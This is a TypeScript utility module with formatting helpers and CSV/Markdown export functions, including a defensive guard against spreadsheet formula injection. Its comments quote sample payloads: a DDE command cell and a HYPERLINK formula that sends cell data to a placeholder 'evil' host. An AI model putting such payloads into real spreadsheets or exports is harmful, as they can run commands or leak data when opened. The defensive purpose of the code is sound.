// Shared formatting + export helpers (ported from Blazor Phase1/2/3 logic).

export function formatDateTime(dt?: string | null): string {
  if (!dt) return '—';
  // The platform stores timestamps as Jakarta wall-clock (Asia/Jakarta, UTC+07).
  // EF/SQLite may append a trailing offset (e.g. "+00:00") or emit a naive string.
  // We display the value verbatim (truncated to seconds) rather than re-interpreting
  // it through the viewer's local timezone — every LAN client shows the same thing.
  const normalized = dt.includes('T') ? dt.replace('T', ' ') : dt;
  const trimmed =
    normalized.includes('.') ? normalized.slice(0, normalized.lastIndexOf('.')) : normalized;
  return trimmed.replace(/[+-]\d{2}:\d{2}$/, '').replace('Z', '');
}

export function formatIdr(value: number): string {
  const s = value.toLocaleString('id-ID', {
    style: 'currency',
    currency: 'IDR',
    maximumFractionDigits: 0,
  });
  // toLocaleString emits a non-breaking space; normalize to a plain space for
  // deterministic rendering/export across browsers.
  return s.replace(/\u00A0/g, ' ');
}

export function parseJsonList(json?: string | null): string[] {
  if (!json) return [];
  try {
    const items = JSON.parse(json);
    return Array.isArray(items) ? items : [json];
  } catch {
    return [json];
  }
}

/**
 * Leading characters that make a spreadsheet treat a CSV cell as a formula
 * rather than as text (CWE-1236 "Formula Injection").
 *
 *   =  -> =SUM(...), =HYPERLINK(...), =cmd|'/c calc'!A1   (DDE / CSV injection)
 *   +  -> +1+1 is evaluated as a formula
 *   -  -> -1+1 is evaluated as a formula
 *   @  -> @SUM(...) is evaluated as a formula (Lotus-legacy syntax)
 *   \t -> TAB (0x09) and CR (0x0D) are stripped/ignored by Excel when they lead
 *   \r    a cell, so "  \t=SUM(1)" still executes. They must be guarded too.
 */
const CSV_FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * Neutralise a single CSV cell against spreadsheet formula injection.
 *
 * A cell whose first character is one of `= + - @ TAB CR` is prefixed with a
 * single apostrophe and quoted. Excel / LibreOffice / Google Sheets then parse
 * the cell as text (`'=SUM(A1)` renders literally) instead of evaluating it,
 * which is what stops a row like `=HYPERLINK("http://evil/?d="&A1)` or
 * `=cmd|'/c calc'!A1` from executing when an operator opens the exported file.
 *
 * Exported so the guard can be unit-tested and reused by other serialisers.
 */
export function escapeCsvCell(value: unknown): string {
  const s = value == null ? '' : String(value);
  const guarded = CSV_FORMULA_LEAD.test(s) ? `'${s}` : s;
  return /[",\n\r]/.test(guarded) ? `"${guarded.replace(/"/g, '""')}"` : guarded;
}

export function toCsv<T extends object>(rows: T[]): string {
  if (rows.length === 0) return '';
  const headers = Object.keys(rows[0]);
  const escape = escapeCsvCell;
  const lines = [headers.map(escape).join(',')];
  for (const row of rows) {
    lines.push(headers.map((h) => escape((row as Record<string, unknown>)[h])).join(','));
  }
  return lines.join('\n');
}

export function downloadFile(filename: string, content: string, mimeType: string) {
  const blob = new Blob([content], { type: mimeType });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

export function downloadCsv<T extends object>(rows: T[], filename: string) {
  downloadFile(filename, toCsv(rows), 'text/csv');
}

export function downloadMarkdown<R extends object>(
  table: { header: string; render: (row: R) => string }[],
  rows: R[],
  filename: string,
) {
  const header = `| ${table.map((c) => c.header).join(' | ')} |`;
  const sep = `| ${table.map(() => '---').join(' | ')} |`;
  const body = rows.map((r) => `| ${table.map((c) => c.render(r)).join(' | ')} |`).join('\n');
  downloadFile(filename, `${header}\n${sep}\n${body}\n`, 'text/markdown');
}

/* ---- Enhanced export with toast feedback ---- */
export function exportWithToast<T extends object>(
  rows: T[],
  filename: string,
  format: 'csv' | 'md',
  columns?: { header: string; render: (row: T) => string }[],
  showToast?: (msg: string, type: 'success' | 'error') => void
): Promise<void> {
  return new Promise((resolve, reject) => {
    try {
      if (format === 'csv') {
        downloadCsv(rows, filename);
      } else {
        if (!columns) throw new Error('Columns required for markdown export');
        downloadMarkdown(columns, rows, filename);
      }
      showToast?.(`Exported ${rows.length} rows to ${filename}`, 'success');
      resolve();
    } catch (e) {
      showToast?.(`Export failed: ${e instanceof Error ? e.message : String(e)}`, 'error');
      reject(e);
    }
  });
}